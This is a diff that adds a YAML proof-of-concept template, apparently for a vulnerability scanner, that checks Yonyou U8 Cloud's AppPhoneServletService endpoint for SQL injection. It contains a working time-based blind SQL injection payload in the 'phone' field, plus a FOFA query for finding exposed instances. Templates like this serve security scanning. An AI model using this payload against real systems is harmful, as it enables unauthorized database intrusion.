@@ -1,0 +1,21 @@
+id: poc-yaml-yongyou-u8-cloud-appphoneservletservice-sqli
+info:
+  name: 用友U8 Cloud AppPhoneServletService SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友U8cloud
+  fofa: app="用友-U8-Cloud"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 1
+requests:
+- method: POST
+  path: /service/~erm/nc.pubitf.erm.mobile.appservice.AppPhoneServletService
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+    accountCode: U8cloud
+  data: module=sm&method=getUserInfoByPhone&phone=1';WAITFOR+DELAY+'0:0:{{.t1}}'--+
+  expression: status_code == 200 && contains(body,"\"success\":false") && contains(headers,"text/json")
+    && duration >= t1 && duration <= t2
+transport: http
